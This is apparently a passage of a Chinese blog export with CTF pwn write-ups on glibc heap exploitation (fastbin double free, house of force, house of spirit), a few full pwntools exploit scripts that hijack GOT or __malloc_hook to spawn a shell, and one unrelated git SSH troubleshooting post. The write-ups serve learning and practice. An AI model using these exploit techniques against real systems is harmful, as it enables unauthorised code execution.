class="number">0x50</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(fake_chunk),<span class="number">0x50</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>,<span class="number">0x50</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="wustctf2020-easyfast"><a href="#wustctf2020-easyfast" class="headerlink" title="wustctf2020_easyfast"></a><em>wustctf2020_easyfast</em></h2><p>&#x3D;&#x3D;<em>uaf</em> + <em>double free</em>&#x3D;&#x3D;</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p><strong>后门函数：</strong></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101759414.png" alt="image-20240710175956377"></p>
<p><strong>整体思路：</strong></p>
<p>​	构造一个地址为<code>0x602090</code>的_fake_chunk_，并将其添加到_fastbins_中。然后申请同样大小的_chunk_，得到地址为<code>0x602090</code>的_chunk_，便能把<code>0x602090</code>地址的值改成<code>0</code>。</p>
<p>调试找到我们要构造的_fake_chunk_的_size_大小，如图为<code>0x50</code>，那么我们接下来就要申请<code>0x40</code>的_chunk_。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101800574.png" alt="image-20240710180059536"></p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./a&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25948</span>)</span><br><span class="line">debug(p,<span class="number">0x400B38</span>,<span class="number">0x400B44</span>,<span class="number">0x400B50</span>,<span class="number">0x400B5C</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size&gt;&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index&gt;&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index&gt;&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"><span class="comment">#申请两个chunk，</span></span><br><span class="line">magic_addr = <span class="number">0x602080</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#free chunk1</span></span><br><span class="line">edit(<span class="number">0</span>,p64(magic_addr)) <span class="comment">#构造地址为0x602090的fake_chunk，使fastbin_chunk0的fd指向fake_chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#因为double free，从fastbins中返回fastbin_chunk0，成为chunk2</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#从fastbins中返回fastbin_chunk1，成为chunk3</span></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)) <span class="comment">#修改chunk3的内容为0，即使0x602090=0</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>git时出现“Please make sure you have the correct access rights and the repository exists.”</title>
    <url>/2024/09/08/git%E6%97%B6%E5%87%BA%E7%8E%B0%E2%80%9CPlease-make-sure-you-have-the-correct-access-rights-and-the-repository-exists-%E2%80%9D/</url>
    <content><![CDATA[<p>这篇文章主要是记录一下自己之前在利用git这个命令时遇到的一些问题。</p>
<span id="more"></span>

<p>1、查看用户名和邮箱是否与自己之前设置的一样</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure>

<p>2、如果不一样或者忘了之前设置的是什么了，可以重置一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure>

<p>3、删除本地<code>.ssh</code>目录下的<code>known_host</code>，<code>id_rsa</code>，<code>id_rsa.pub</code>文件，重新生成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure>

<p>4、在<code>github</code>中新建<code>ssh key</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202409080000711.png" alt="QQ_1725724833042"></p>
<p>复制<code>id_rsa.pub</code>中的全部内容，粘贴到该处，点击<code>Add SHH key</code>即可</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202409080002029.png" alt="QQ_1725724911246"></p>
<p>5、然后输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p>​	到这一步后依然出错，我的是因为命名了密钥, 但是ssh连接默认是会使用默认名称的, 并不是放在<code>~./ssh</code>目录下就会自动读取，所以我通过使用<code>config</code>配置文件来解决这个问题。</p>
<p>6、在<code>.ssh</code>目录下添加文件<code>config</code>，在文件中添加下面内容</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">	<span class="keyword">User</span> <span class="title">git</span></span><br><span class="line">	IdentityFile ~/.ssh/私钥文件名称</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>house of force学习笔记</title>
    <url>/2024/07/20/house-of-force%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>自由控制创建的_chunk_的地址，到目标地址上。</p>
<p>当我们使_chunk_的地址，落在_chunk_hook_区域后，就可以对_chunk_hook_区域进行任意泄漏和写，进而也就能对_chunk_hook_里的地址进行任意泄漏和写。</p>
<h3 id="check"><a href="#check" class="headerlink" title="check"></a><em>check</em></h3><p>_glibc_会对用户请求的大小和_Top chunk_现有的_size_进行验证，如果_size_不够大。就不会使用_Top chunk_来进行分配。我们可以篡改_size_为一个很大值来绕过这个验证。一般的做法是把_Top chunk_的_size_改为<code>-1</code>，因为在进行比较时会把_size_转换成无符号数，因此<code>-1</code>也就是说_unsigned long_中最大的数。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>做了几道题，简单归纳一下关于_house of force_的做题步骤：</p>
<ol>
<li><p>使_Top chunk_的_size_为<code>0xffffffffffffffff</code>（<code>32</code>位是<code>0xffffffff</code>）。</p>
</li>
<li><p>计算偏移_offset_。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset = target_addr-Top_chunk_addr-<span class="number">4</span>*unit_size</span><br><span class="line"><span class="comment">#Top_chunk_addr是Top_chunk的首地址</span></span><br><span class="line"><span class="comment">#unit_size是一个内存单元的大小</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建大小为_offset_的_chunk_。</p>
</li>
</ol>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>如果一个堆漏洞，想通过_house of force_方法进行利用，需要以下条件，</p>
<ol>
<li>能够溢出等方式，控制到_Top chunk_的_size_域</li>
<li>能够控制_chunk_分配尺寸的大小</li>
</ol>
<p>进行堆分配时，如果所有_free_的_chunk_都无法满足需求，那么就会从_Top chunk_中，分割出相应大小的内存，来作为_chunk_的空间</p>
<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><em>bcloud_bctf_2016</em></h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>由于之前做的题，漏洞点大都是在一些对_chunk_的功能函数里，所以这次我就死盯着那几个函数分析，半天也没发现什么。其实，这道题的漏洞点，在菜单函数前面的一个函数里。所以，以后做题千万不能惯性思维，漏洞点可能存在于任何一个函数中。</p>
<h4 id="sub-804899C"><a href="#sub-804899C" class="headerlink" title="sub_804899C"></a><em>sub_804899C</em></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804899C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_80487A1();</span><br><span class="line">  <span class="keyword">return</span> sub_804884E();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-80487A1"><a href="#sub-80487A1" class="headerlink" title="sub_80487A1"></a><em>sub_80487A1</em></h4><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252031336.png" alt="1"></p>
<p>填满<code>64</code>个字节，就可以泄露出_v2_后面的数据，调试后可以发现是一个_chunk_的首地址。</p>
<h4 id="sub-804884E"><a href="#sub-804884E" class="headerlink" title="sub_804884E"></a><em>sub_804884E</em></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_804884E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-9Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">68</span>]; <span class="comment">// [esp+60h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x90u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Org:&quot;</span>);</span><br><span class="line">  sub_804868D(s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Host:&quot;</span>);</span><br><span class="line">  sub_804868D(v3, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x40u</span>);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x40u</span>);</span><br><span class="line">  dword_804B0C8 = v2;</span><br><span class="line">  dword_804B148 = v4;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, v3);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OKay! Enjoy:)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>泄漏_chunk_地址，获得_Top chunk_地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendafter(<span class="string">&quot;Input your name:\n&quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#注意只能用send，不能sendline</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">chunk_addr = u32(p.recvuntil(<span class="string">b&#x27;!&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;chunk_addr&quot;</span>)</span><br><span class="line">top_chunk_addr = chunk_addr+<span class="number">0xd0</span></span><br><span class="line">log_addr(<span class="string">&quot;top_chunk_addr&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>改写_Top chunk_的_size_为<code>0xffffffff</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p.sendafter(&quot;Org:\n&quot;,b&#x27;B&#x27;*0x40)</span><br><span class="line">#send发送</span><br><span class="line">p.sendlineafter(&quot;Host:\n&quot;,p32(0xffffffff))</span><br></pre></td></tr></table></figure>

<p>计算_target_addr_距离_top_chunk_addr_的偏移量，再<code>-0x10</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target_addr = <span class="number">0x804b120</span></span><br><span class="line">offset = target_addr-top_chunk_addr-<span class="number">0x10</span></span><br><span class="line">add((offset),<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./a&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29127</span>)</span><br><span class="line">debug(p,<span class="number">0x8048D2D</span>,<span class="number">0x8048CFE</span>,<span class="number">0x8048D11</span>,<span class="number">0x8048D1F</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the length of the note content:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the new content:\n&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Input your name:\n&quot;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">chunk_addr = u32(p.recvuntil(<span class="string">b&#x27;!&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;chunk_addr&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Org:\n&quot;</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Host:\n&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line">top_chunk_addr = chunk_addr+<span class="number">0xd0</span></span><br><span class="line">log_addr(<span class="string">&quot;top_chunk_addr&quot;</span>)</span><br><span class="line">target_addr = <span class="number">0x804b120</span></span><br><span class="line">offset = target_addr-top_chunk_addr-<span class="number">0x10</span></span><br><span class="line">add((offset),<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p32(<span class="number">0x0804B120</span>+<span class="number">0x10</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">add(<span class="number">0x20</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a><em>gyctf_2020_force</em></h2><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from tools import *</span><br><span class="line"><span class="meta"># context.log_level=<span class="string">&quot;debug&quot;</span></span></span><br><span class="line">p = process(<span class="string">&quot;./a&quot;</span>)</span><br><span class="line"><span class="meta"># p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,28722)</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xCCB</span>)#<span class="number">0xCD7</span>,</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,str(size))</span><br><span class="line">    p.recvuntil(b<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">    chunk_data_addr = <span class="type">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content\n&quot;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> chunk_data_addr</span><br><span class="line">def <span class="built_in">puts</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,str(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_addr = add(<span class="number">0x20000</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">log_addr(<span class="string">&quot;libc_addr&quot;</span>)</span><br><span class="line">libc_base = libc_addr<span class="number">-0x5cb010</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">payload = b<span class="number">&#x27;b</span><span class="string">&#x27;*0x10+p64(0)+p64(0xffffffffffffffff)</span></span><br><span class="line"><span class="string">chunk_data_addr = add(0x10,payload)</span></span><br><span class="line"><span class="string">top_chunk_addr = chunk_data_addr+0x10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">malloc_hook = libc_base+libc.sym[&#x27;</span>__malloc_hook<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">log_addr(&quot;malloc_hook&quot;)</span></span><br><span class="line"><span class="string">offset = malloc_hook-top_chunk_addr-0x20-0x10</span></span><br><span class="line"><span class="string">add(offset,b&#x27;</span>c<span class="string">&#x27;*8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line"><span class="string">one_gadget = libc_base+one_gadget[1]</span></span><br><span class="line"><span class="string">realloc_addr = libc_base+libc.sym[&#x27;</span><span class="built_in">realloc</span><span class="string">&#x27;]</span></span><br><span class="line"><span class="string">payload = b&#x27;</span>A<span class="string">&#x27;*8+p64(one_gadget)+p64(realloc_addr+4)</span></span><br><span class="line"><span class="string">add(0x20,payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;2:puts\n&quot;,str(1))</span></span><br><span class="line"><span class="string">p.sendlineafter(&quot;size\n&quot;,str(20))</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>



<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a><em>hitcontraining_bamboobox</em></h2><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>利用溢出修改_Top chunk_的_size_为<code>0xffffffffffffffff</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br></pre></td></tr></table></figure>

<p>创建_chunk_，使其地址在_Top chunk_的上面，距离<code>0x70</code>的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">magic = <span class="number">0x400D49</span></span><br><span class="line">add((-<span class="number">0x70</span>),<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">p,elf,libc = load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,25055)</span></span><br><span class="line">debug(p,<span class="number">0x400E84</span>,<span class="number">0x400E90</span>,<span class="number">0x400E9C</span>,<span class="number">0x400EA8</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D49</span></span><br><span class="line">add((-<span class="number">0x70</span>),<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>house of spirit学习笔记</title>
    <url>/2024/07/08/house-of-spirit%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
<p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
<p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p>
<ul>
<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li>
<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
</ul>
<p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p>
<h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="ZJCTF 2019]EasyHeap"></a><em>ZJCTF 2019]EasyHeap</em></h2><p>&#x3D;&#x3D;<em>uaf</em> + 堆溢出 + <em>house of spirit</em> + <em>double free</em>&#x3D;&#x3D;</p>
<h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><ol>
<li>如果想覆盖任意地址的数据，那么可以在任意地址或其前面构造一个<code>fake_chunk</code>，然后使<code>fastbins</code>中的<code>fd</code>指针指向这个<code>fake_chunk</code>的首地址（可以通过堆溢出），我们便能通过从<code>fastbins</code>获取<code>chunk</code>的方式来改写任意地址里的数据。</li>
<li><code>fastbins</code>中是以单链表形式管理<code>fastbin_chunk</code>的，每个<code>fastbin_chunk</code>的<code>fd</code>指针指向链表中的下一个<code>fastbin_chunk</code>，最后一个<code>fastbin_chunk</code>的<code>fd</code>的值是<code>0</code>。</li>
<li>程序中通常会有一张表来管理申请的<code>chunk</code>，本题中，<code>heaparray</code>数组中的一个单元指向一个<code>chunk</code>。</li>
</ol>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>整体思路：</strong>	</p>
<p>​	程序中有_sytsem_函数，_RELRO_保护是_Partial RELRO_，所以我们可以劫持_free_的_got_表为_system@plt_，再_free_一个_chunk_即可得到_shell_。</p>
<p>​	程序中通常会有一张表来管理申请的_chunk_，本题中，_heaparray_数组便存放着我们申请的每一个堆块的内容地址。我先随便申请了两个_chunk_，<code>0x6020e0</code>是_heaparray_的首地址，如图：</p>
